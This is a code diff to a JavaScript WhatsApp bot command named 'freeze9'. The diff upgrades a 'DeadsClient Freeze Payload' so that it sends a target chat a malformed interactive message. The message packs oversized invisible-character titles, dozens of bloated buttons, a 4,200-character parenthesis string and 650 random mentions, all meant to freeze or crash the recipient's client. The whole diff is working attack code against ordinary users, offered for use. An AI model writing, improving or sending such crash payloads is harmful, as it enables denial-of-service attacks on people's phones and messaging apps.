@@ -14765,45 +14765,71 @@ case "freeze9": {
     const target = msg.key.remoteJid;
 
     try {
-        const buttons = [];
+        const ButtonsQPay = [
+            {
+                name: "single_select",
+                buttonParamsJson: JSON.stringify({
+                    title: "\u200E".repeat(8500),
+                    sections: [{ title: "\u200E", rows: [] }]
+                })
+            }
+        ];
 
-        // Großer Single Select
-        buttons.push({
-            name: "single_select",
-            buttonParamsJson: JSON.stringify({
-                title: "\u200E".repeat(6000),
-                sections: [{ title: "\u200E", rows: [] }]
-            })
-        });
-
-        // Crash-Buttons (weniger für Stabilität)
-        for (let i = 0; i < 25; i++) {
-            buttons.push(
+        for (let i = 0; i < 40; i++) {
+            ButtonsQPay.push(
                 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
-                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "3".repeat(1800) }) },
-                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "3".repeat(1800) }) }
+                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) },
+                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2500) }) }
             );
         }
 
-        const messageContent = {
-            text: "☠️ DeadsClient Freeze Payload 🔥",
-            nativeFlowMessage: {
-                buttons: buttons,
-                messageParamsJson: "(".repeat(2000)
+        const messageContent = generateWAMessageFromContent(
+            target,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: {
+                            header: {
+                                title: " | ☠️DeadsClient 🔥",
+                                hasMediaAttachment: false,
+                            },
+                            body: {
+                                text: "☠️DeadsClient 🔥 Freeze Payload"
+                            },
+                            contextInfo: {
+                                participant: target,
+                                mentionedJid: [
+                                    "0@s.whatsapp.net",
+                                    ...Array.from({ length: 650 }, () => 
+                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                                    )
+                                ],
+                                isForwarded: true,
+                                forwardingScore: 1972
+                            },
+                            nativeFlowMessage: {
+                                buttons: ButtonsQPay,
+                                messageParamsJson: "(".repeat(4200)
+                            }
+                        },
+                        quotedMessage: {
+                            paymentInviteMessage: {
+                                serviceType: "UPI",
+                                expiryTimestamp: Date.now()
+                            }
+                        }
+                    }
+                }
             },
-            contextInfo: {
-                mentionedJid: [
-                    "0@s.whatsapp.net",
-                    ...Array.from({ length: 300 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
-                ],
-                isForwarded: true,
-                forwardingScore: 999
-            }
-        };
+            { timestamp: new Date() }
+        );
 
         await sock.sendMessage(target, messageContent);
-
-        console.log(`✅ Freeze9 gesendet an ${target}`);
+        console.log(`✅ Freeze9 gesendet an ${target} (starke Version)`);
 
     } catch (e) {
         console.error("❌ Freeze9 Error:", e.message || e);
